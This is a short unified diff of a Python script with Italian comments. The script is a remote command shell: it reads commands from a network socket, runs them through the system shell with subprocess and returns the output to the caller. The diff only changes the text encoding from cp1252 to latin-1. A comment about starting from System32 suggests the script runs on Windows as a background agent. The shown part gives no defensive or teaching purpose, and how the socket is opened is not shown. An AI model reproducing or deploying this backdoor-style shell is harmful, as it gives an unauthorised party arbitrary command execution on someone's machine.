@@ -20,20 +20,21 @@ os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, 
 
 while True:
     try:
-        cmd = connectionSocket.recv(1048576).decode(encoding='cp1252')
+        cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
         if cmd.startswith("cd") :
             if not((cmd[2:]).isspace() or len(cmd)==2) :
                 os.chdir(cmd[3:])
             result = os.getcwd()
         else:
-            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='cp1252').stdout
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
             if result == '':
                 result = "comando non valido\n"
-        connectionSocket.send(result.encode(encoding='cp1252'))
+        connectionSocket.send(result.encode(encoding='latin-1'))
     except:
         traceback.print_exc()
+        
         result = "errore"
-        connectionSocket.send(result.encode(encoding='cp1252'))
+        connectionSocket.send(result.encode(encoding='latin-1'))
     
 
 
